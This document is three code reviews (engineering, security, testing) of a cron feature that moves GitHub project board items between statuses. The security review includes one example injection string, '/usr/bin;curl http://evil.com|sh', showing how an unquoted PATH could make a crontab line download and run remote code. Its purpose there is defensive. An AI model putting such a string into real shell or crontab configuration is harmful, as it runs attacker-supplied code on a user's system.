# Engineer Review — cron-based-outer-loop

**Reviewer:** Engineer
**Feature:** `agt cron-tick` transitions board item Ready → In Progress → Done
**Files read:** `bin/lib/cron.mjs`, `bin/lib/github.mjs` (full), `test/cron-tick.test.mjs` (full), `bin/lib/util.mjs` (partial — lockFile), `task-2/handshake.json`, `task-2/artifacts/test-output.txt`

---

## Overall Verdict: PASS

No critical (🔴) findings. Two warnings (🟡) must go to backlog. Three suggestions (🔵) optional.

---

## Per-Criterion Results

### Correctness — PASS

**Happy path verified** (`cron.mjs:85–118`):
- Pre-flight checks tracking config and ready option ID before acquiring lock — correct order.
- Lock uses `timeout: 0` which with `deadline = Date.now() + 0` causes exactly one attempt. Evidence: `util.mjs:101,120` — deadline expires after first check iteration. Correct for cron semantics.
- `_listProjectItems` is synchronous (`spawnSync` in `github.mjs`), so no missing `await`. ✓
- `readyItems` filters `i.status?.toLowerCase() === "ready"` — case-insensitive. ✓
- The `finally` block releases the lock on all exit paths including the early `return` at line 94. ✓

**Failure path verified** (`cron.mjs:113–118`):
- Catch block reverts to "ready" then comments. Error message uses `err.message || String(err)` — handles non-Error throws. ✓

**Edge cases checked:**
- `item.title` null/undefined: `(item.title || "").replace(...)` — handled. ✓
- Multiple ready items: first is taken, rest ignored — matches spec. ✓
- Lock release when `!lock.acquired`: exits before `try` block; `finally` never reached — no double-release. ✓

### Code Quality — PASS

Logic is readable and well-decomposed. Dependency injection via `deps` makes the module fully testable. The `readProjectNumber` helper is a private function with a clear single responsibility.

Minor note from prior review (different reviewer role): `return` at line 82 and `lock.acquired &&` at line 120 are dead under all reachable paths, but this is a simplicity/cleanup concern, not an engineer-correctness concern.

### Error Handling — WARN

**Three calls to `_setProjectItemStatus` discard their return values** (`cron.mjs:106,111,115`). The function returns `false` on failure.

The most serious case is line 115 (revert to "ready" after failed dispatch): if this transition fails, the board item is permanently stuck in "in-progress" with no warning logged. The next cron-tick run will not pick it up (it filters for "Ready" only), so the work item silently falls out of the queue. This is the revert path that most needs to succeed.

The happy-path cases (lines 106, 111) are lower severity — a failed "in-progress" or "done" transition just leaves the board visually stale, but execution still proceeds correctly.

`_commentIssue` return value also discarded (line 116), though this is informational-only.

### Performance — PASS

`setProjectItemStatus` in `github.mjs:266` calls `readTrackingConfig()` with no arguments, causing a second independent read of PROJECT.md at call time. `cmdCronTick` already read and validated the tracking config at line 57. In production (same process, same `cwd`) this reads the same file twice per status transition, and there are up to 3 transitions per cron-tick run (6 reads of PROJECT.md total). Not a correctness issue; the double-read is harmless and the file is small. Flagged as suggestion.

### Test Coverage — WARN (ordering not enforced)

The test "transitions status to in-progress then done on successful dispatch" (`cron-tick.test.mjs:153–156`) verifies both transitions occurred but uses `.some()` — it does **not** verify ordering. An implementation that called `setProjectItemStatus("done")` before `setProjectItemStatus("in-progress")` (or called them in any order, even swapped) would pass this test.

Same issue on the failure path (`cron-tick.test.mjs:183–185`): the test verifies both "in-progress" and "ready" transitions were made but does not confirm "in-progress" preceded execution and "ready" followed the error. The spec guarantee ("before execution" / "on success") is not enforced by the test.

The fix is straightforward — check index positions in `statusTransitions` array.

---

## Findings

🟡 test/cron-tick.test.mjs:153 — Test verifies both transitions occurred but not their order; use `findIndex` to assert `inProgressIdx < doneIdx` and that run was called between them
🟡 bin/lib/cron.mjs:115 — `_setProjectItemStatus` return value discarded on the failure revert path; if this call fails, the board item is stuck in "in-progress" permanently with no log message — at minimum log a warning on `false` return
🔵 bin/lib/cron.mjs:106 — `_setProjectItemStatus` return value discarded for "in-progress" pre-execution transition; failed board update goes unlogged
🔵 bin/lib/cron.mjs:111 — `_setProjectItemStatus` return value discarded for "done" post-execution transition; failed board update goes unlogged
🔵 bin/lib/github.mjs:266 — `readTrackingConfig()` called with no args inside `setProjectItemStatus`, causing a redundant PROJECT.md read every time; accept tracking config as a parameter or use the already-loaded config from the caller

---

# Security Review — cron-based-outer-loop

**Reviewer:** Security
**Feature:** `agt cron-tick` transitions board item Ready → In Progress → Done
**Files read:** `bin/lib/cron.mjs` (all 147 lines), `bin/lib/github.mjs` (lines 1–16, 207–285), `test/cron-tick.test.mjs` (all 322 lines), `task-2/artifacts/test-output.txt` (first 100 lines), `task-2/handshake.json`

---

## Overall Verdict: PASS

No critical (🔴) findings. Two 🟡 warnings must go to backlog. Tests pass (task-2 gate: exit 0, all cases green).

---

## Threat Model

**Adversaries considered:**
- Attacker who controls a project's `.envrc`, npm lifecycle scripts, or shell profile before `cron-setup` runs
- Attacker who crafts a malicious GitHub issue title to target the Claude agent via prompt injection
- Passive observer reading public GitHub issue comments to harvest local path or token data

**Out of scope:** GitHub API authentication (delegated to `gh` CLI), lock-file race conditions (covered by OS-level file locking in `util.mjs`), SSRF (no outbound HTTP from JS layer).

---

## Per-Criterion Results

### Shell Injection (cron-setup) — WARN

**`cron.mjs:141`** — `process.env.PATH` is embedded bare (no quoting) in the generated crontab line:

```
PATH=${process.env.PATH} ${quotePath(agtPath)} cron-tick ...
```

`cwd` and `agtPath` are wrapped with `quotePath()`, but `PATH` is not. If PATH contains shell metacharacters (`;`, `&&`, `|`, spaces — feasible from a hostile `.envrc`, npm `prepare` script, or project-local tooling), the printed crontab line becomes injectable. Example: PATH containing `/usr/bin;curl http://evil.com|sh` produces a crontab entry that runs the injected command every N minutes as the user. `quotePath` is already in scope; fix is one token. Also: if PATH is `undefined` (stripped CI environments), the literal string `PATH=undefined` is emitted, silently breaking cron.

**This finding was raised in the prior iteration ([security] cron.mjs:141) and persists unchanged.**

### Information Disclosure via Error Message — WARN

**`cron.mjs:116`** — raw `err.message` is posted as a public GitHub issue comment:

```js
_commentIssue(issueNumber, `cron-tick failed: ${err.message || String(err)}`);
```

Errors thrown by `_runSingleFeature` or its transitive dependencies can include local absolute paths (ENOENT messages), `gh` CLI authentication error details, or internal tool state. On a public repo this data is world-readable. The `commentIssue` call uses `spawnSync` with an array (not `shell: true`), so there is no secondary shell injection risk from the body content — the risk is purely data disclosure.

Fix: strip absolute paths and truncate before posting, e.g.:
```js
err.message.replace(/\/[^\s:'"]+/g, "<path>").slice(0, 300)
```

### Prompt Injection via Title — PASS (with observation)

**`cron.mjs:101`** — title sanitization strips ASCII control characters and newlines before passing to `_runSingleFeature`:

```js
(item.title || "").replace(/[\r\n\x00-\x1f\x7f]/g, " ").trim().slice(0, 200)
```

This is adequate for the primary injection vector (newline-based prompt stuffing). Unicode bidirectional override characters (U+202A–U+202E, U+2066–U+2069) and zero-width joiners are not filtered; these create minor terminal visual spoofing potential but are unlikely to affect Claude API behavior. Flagged 🔵 for completeness.

### Argument Forwarding — PASS

Status values ("in-progress", "done", "ready") passed to `setProjectItemStatus` are hardcoded string literals, not derived from CLI input or GitHub-returned data. `issueNumber` and `projectNumber` are passed to `gh` CLI via `spawnSync` array args (`spawnSync("gh", args, ...)` without `shell: true`), eliminating shell injection risk from those values.

### Secrets Management — PASS

No credentials or tokens appear in `cron.mjs`. GitHub auth is delegated entirely to the `gh` CLI binary. No secrets are written to log files or issue comments under normal operation.

### Lock File — PASS

Lock path is constructed from `process.cwd()` (not user input). `timeout: 0` means a single try-once; no polling loop exploitable by an attacker controlling the lock. `finally` block always releases, preventing permanent denial of service.

---

## Findings

🟡 bin/lib/cron.mjs:141 — `process.env.PATH` unquoted in crontab template; shell metacharacters in PATH produce an injectable crontab line; also emits `PATH=undefined` when PATH is unset. Fix: `PATH=${quotePath(process.env.PATH ?? "")}`

🟡 bin/lib/cron.mjs:116 — Raw `err.message` posted to public GitHub issue comment; can expose local file paths, auth error details, or internal state. Fix: strip absolute paths and truncate to ≤300 chars before posting.

🔵 bin/lib/cron.mjs:101 — Title sanitization covers ASCII control chars but not Unicode bidi overrides (U+202A–U+202E); extend regex if terminal display integrity is a concern.

---

# Tester Evaluation — cron-based-outer-loop

**Role:** Test Strategist
**Date:** 2026-04-24
**Files read:** `bin/lib/cron.mjs` (full, 147 lines), `test/cron-tick.test.mjs` (full, 323 lines), `bin/lib/github.mjs` (listProjectItems), `test/cli-commands.test.mjs` (cron-tick section)
**Test evidence:** `task-2/artifacts/test-output.txt` lines 239–254 — 12 tests, all pass, exit code 0

---

## Overall Verdict: PASS

The core feature — `Ready → In Progress → Done` board transitions with failure revert and advisory locking — is correctly implemented and exercised by passing tests. All 7 `cmdCronTick` and 5 `cmdCronSetup` tests pass (confirmed: test-output.txt lines 240–253). No critical test gaps block merge.

Two 🟡 warnings go to backlog: transition ordering is unverified by test assertions, and the "dispatch only the first item" contract is incompletely covered.

---

## Per-Criterion Results

### Ready → In Progress before execution — PASS
`cron.mjs:106` calls `setProjectItemStatus("in-progress")` before `await _runSingleFeature(...)` at line 109. Test #3 (`cron-tick.test.mjs:125`) records transitions and asserts the in-progress entry exists via `.some()`. ⚠ Ordering not enforced — see 🟡 below.

### → Done on success — PASS
`cron.mjs:111` calls `setProjectItemStatus("done")` in the success branch. Same test #3 asserts the done entry via `.some()`.

### Revert to Ready + comment on failure — PASS
`cron.mjs:115–116` reverts to "ready" then posts a comment. Test #4 (`cron-tick.test.mjs:161`) verifies both transitions and that `"agent exploded"` appears in the comment body. Direct evidence: test-output.txt line 235.

### Advisory lock prevents concurrent runs — PASS
Lock acquired with `timeout: 0` at line 78. Lines 79–82 exit 0 when `!lock.acquired`. Test #2 verifies "already running" log and `exitCode === 0`.

### Pre-flight guards — PASS
Tests #5, #6, #7 each verify `exitCode === 1` for missing tracking config, missing project number, and missing Ready option ID. All pass (test-output.txt lines 244–246).

### First ready item dispatched only — PARTIAL (🟡)
Test #3 presents two ready items but asserts only that issue #7's title reached `runSingleFeature`. No call-count assertion on `runSingleFeature`, and no check that issue #8 transitions were NOT recorded. A regression dispatching all ready items sequentially would pass current tests.

### Transition ordering — PARTIAL (🟡)
Both success (lines 153–156) and failure (lines 183–185) tests use `.some()` for status assertions. A bug setting "done" before "in-progress" (or "ready" before "in-progress" on the failure path) would satisfy both assertions and pass undetected.

---

## Findings

🟡 `test/cron-tick.test.mjs:153` — Transition ordering not enforced; replace `.some()` with index-based assertions (`statusTransitions[0].status === "in-progress"` and `statusTransitions[1].status === "done"`) to catch order regression
🟡 `test/cron-tick.test.mjs:125` — "First item only" contract not fully tested; add a `runCallCount` counter asserting exactly 1 call, and verify no transitions were recorded for `issueNumber === 8`
🟡 `bin/lib/cron.mjs:141` — `process.env.PATH` has no null guard; if PATH is undefined the crontab output contains literal `PATH=undefined`; add `?? ""` and a test covering undefined PATH
🔵 `bin/lib/cron.mjs:87` — No `?? []` guard before `.filter()` at line 90; real impl always returns `[]` on error (github.mjs:227 documents this), but a null return from a future impl change throws an uncontextual TypeError with no diagnostic — add `?? []`
🔵 `bin/lib/cron.mjs:101` — Title sanitization (control-char strip, 200-char truncation) has no dedicated test; add cases with embedded `\n` and a 300-char title to assert the sanitized value reaches `runSingleFeature`
🔵 `test/cron-tick.test.mjs` — Non-numeric `--interval` (e.g. `"abc"`) untested; `parseInt("abc", 10)` returns NaN and correctly falls back to 30, but the path has no test coverage
🔵 `bin/lib/cron.mjs:116` — Raw `err.message` posted to GitHub comment without sanitization; may expose file paths in public repos; truncate/redact before posting

---

## Edge Cases Checked

| Path | Covered? |
|---|---|
| No ready items | ✅ test #1 |
| Lock already held | ✅ test #2 |
| in-progress → done (success) | ✅ test #3 (ordering: ⚠ `.some()` only) |
| Revert to ready + comment (failure) | ✅ test #4 |
| Missing tracking config | ✅ test #5 |
| Missing project number | ✅ test #6 |
| Missing Ready option ID | ✅ test #7 |
| Multiple ready items — only first dispatched | ⚠ partial (no call-count assertion) |
| Case-insensitive status match ("READY") | ⚠ implicit only ("Ready" used in tests) |
| Title with control chars / >200 chars | ❌ no test |
| `process.env.PATH` undefined in cron-setup | ❌ no test |
| Non-numeric `--interval` | ❌ no test |
| `_listProjectItems` returns null/undefined | ❌ no guard, no test |
